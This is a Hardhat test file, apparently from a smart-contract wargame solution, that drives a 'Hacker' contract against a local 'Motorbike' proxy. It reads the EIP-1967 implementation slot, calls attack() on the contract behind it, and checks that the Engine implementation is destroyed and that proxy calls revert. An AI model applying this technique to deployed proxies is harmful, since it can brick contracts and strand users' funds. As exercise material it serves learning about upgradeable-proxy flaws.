import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { BigNumber, constants } from "ethers";
import { deployments, ethers, getNamedAccounts } from "hardhat";

import { Engine, Hacker, Motorbike } from "../typechain";

chai.use(solidity);

describe("Hacker", () => {
  let deployer: SignerWithAddress;
  let hacker: SignerWithAddress;

  let hackerContract: Hacker;
  let motorbike: Motorbike;
  let engine: Engine;

  before(async () => {
    await deployments.fixture(["Motorbike", "Hacker"]);

    deployer = await ethers.getSigner((await getNamedAccounts()).deployer);
    console.log("deployer", deployer.address);
    hacker = await ethers.getSigner((await getNamedAccounts()).hacker);
    console.log("hacker", hacker.address);

    hackerContract = await ethers.getContract("Hacker");
    motorbike = await ethers.getContract("Motorbike");
    engine = await ethers.getContract("Engine");
  });

  it("should validate Motorbike is working", async () => {
    // engine should have code
    const code = await ethers.provider.getCode(engine.address);
    expect(code.length).to.be.gt(2); // 0x prefixed
    // read motorbike as proxy and validate
    const motorbikeImpl: Engine = await ethers.getContractAt(
      "Engine",
      motorbike.address
    );
    expect(await motorbikeImpl.horsePower()).to.be.equal(1000);
    expect(await motorbikeImpl.upgrader()).to.be.equal(deployer.address);
  });

  it("should destory engine successfully", async () => {
    const engineImplSlotValue = await ethers.provider.getStorageAt(
      motorbike.address,
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    );
    console.log("retrieved address slot value", engineImplSlotValue);
    await hackerContract.connect(hacker).attack(engineImplSlotValue);
    // engine should not have code
    const code = await ethers.provider.getCode(engine.address);
    expect(code.length).to.be.lte(2); // 0x prefixed
  });

  it("should revert on any engine interactions", async () => {
    const motorbikeImpl: Engine = await ethers.getContractAt(
      "Engine",
      motorbike.address
    );
    await expect(motorbikeImpl.horsePower()).to.be.reverted;
    await expect(motorbikeImpl.upgrader()).to.be.reverted;
  });
});
